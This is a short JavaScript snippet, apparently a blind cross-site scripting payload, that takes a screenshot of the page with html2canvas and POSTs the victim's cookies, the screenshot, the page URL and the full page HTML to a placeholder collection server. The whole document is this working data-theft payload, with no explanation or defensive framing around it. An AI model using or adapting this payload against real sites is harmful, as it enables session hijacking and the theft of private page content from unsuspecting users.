html2canvas(document.body).then(canvas => {
    const image = canvas.toDataURL('image/png').replace(/^data:image\/(png|jpg);base64,/, "");
    const vulnerableUrl = window.location.href;
    const vulnerableHtml = document.body.innerHTML; // Get the HTML content

    fetch('http://your-server-address/capture', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'cookie=' + encodeURIComponent(document.cookie) + 
              '&screenshot=' + encodeURIComponent(image) +
              '&vulnerable_url=' + encodeURIComponent(vulnerableUrl) +
              '&vulnerable_html=' + encodeURIComponent(vulnerableHtml)  // Send the HTML content
    });
});
